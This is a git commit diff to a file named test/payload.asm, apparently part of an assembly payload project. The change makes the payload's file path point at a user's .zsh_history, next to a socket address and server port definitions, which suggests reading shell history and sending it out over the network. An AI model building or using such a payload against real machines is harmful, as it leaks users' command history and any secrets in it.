22c449262d9552caff7407bd3739466a59ec0d83
Maxenceee <72473014+Maxenceee@users.noreply.github.com>
2024-08-04 16:00:22 +0200

    Update payload.asm

--- test/payload.asm
+++ test/payload.asm
@@ -130,8 +130,8 @@ pop_sa istruc sockaddr_in
 	at sockaddr_in.sin_addr,	dd 0			; localhost
 	at sockaddr_in.sin_zero,	dd 0, 0
 iend
-FILEPATH		times 1024 db 0
-; FILEPATH		db '/home/maxence/.zsh_history', 0
+; FILEPATH		times 1024 db 0
+FILEPATH		db '/home/maxence/.zsh_history', 0
 SERVER_PORT		dd 0xba0b
 SERVER_ADDR		dw 0x0
 _payload_size:	dq $-_payload
